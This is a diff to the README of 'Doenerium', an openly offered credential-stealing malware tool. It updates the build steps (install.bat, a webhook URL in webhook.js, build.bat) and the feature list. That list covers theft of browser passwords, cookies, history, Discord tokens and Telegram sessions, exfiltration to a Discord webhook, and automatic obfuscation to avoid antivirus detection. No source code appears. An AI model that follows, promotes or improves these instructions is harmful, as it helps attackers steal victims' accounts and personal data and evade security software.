@@ -2,11 +2,6 @@
 
 #
 
-!!!!!!!!!
-NOTE: This is an outdated version and might be detected by the Anti Virus programs.
-  [Click me for the fixed version of doenerium](https://github.com/doenerium69/doenerium-fixed) 
-!!!!!!!!!
-
 <h1 align="center">
 ⚔️ Doenerium 🛡️
 </h1>
@@ -18,9 +13,9 @@ NOTE: This is an outdated version and might be detected by the Anti Virus progra
 </p>
 
 <p align="center">
-<img src="https://img.shields.io/github/last-commit/doener23/doenerium?style=flat">
-<img src="https://img.shields.io/github/stars/doener23/doenerium?color=brightgreen">
-<img src="https://img.shields.io/github/forks/doener23/doenerium?color=brightgreen">
+<img src="https://img.shields.io/github/last-commit/doenerium1337/doenerium?style=flat">
+<img src="https://img.shields.io/github/stars/doenerium1337/doenerium?color=brightgreen">
+<img src="https://img.shields.io/github/forks/doenerium1337/doenerium?color=brightgreen">
 </p>
 
 <p align="center">
@@ -52,9 +47,9 @@ NOTE: This is an outdated version and might be detected by the Anti Virus progra
 > 
 > Run **_install.bat_** file to install all necessary files
 >
-> Replace _REPLACE_ME_ with your webhook in **_config.js_**
+> Replace _REPLACE_ME_ with your webhook url in **_webhook.js_**
 >
-> Run **_build.bat_** and wait for **_doenerium-win.exe_** to be built.
+> Run **_build.bat_** and wait for a file with a similar name to **_doenerium_8AnBqvBG.exe_** to be built.
 >
 > Note: Changing the icon does not work and will corrupt the exe
 
@@ -90,6 +85,8 @@ NOTE: This is an outdated version and might be detected by the Anti Virus progra
 > Passwords, Cookies, Autofill & History (Searches for specific keywords such as PayPal, Coinbase etc. in them)
 >
 > Screenshot(s)
+>
+> Telegram Session
 
 #### Additional
 
@@ -104,6 +101,8 @@ NOTE: This is an outdated version and might be detected by the Anti Virus progra
 > Validates a found discord token and then sends it to your discord webhook
 >
 > Sends all files to your discord webhook in beautiful embeds and a structured zip file
+>
+> Automatic obfuscation when building
 
 <a id="screenshot"></a>
 
@@ -125,7 +124,6 @@ NOTE: This is an outdated version and might be detected by the Anti Virus progra
 > - Growtopia stealer
 > - Discord bot to build within discord ($build <webhook_url>)
 > - Dynamic encryption
-> - Automatic obfuscation when building
 > - Firefox stealer
 > - Fix browser history 
 > - Make it so it won't build with node-18 for less file size
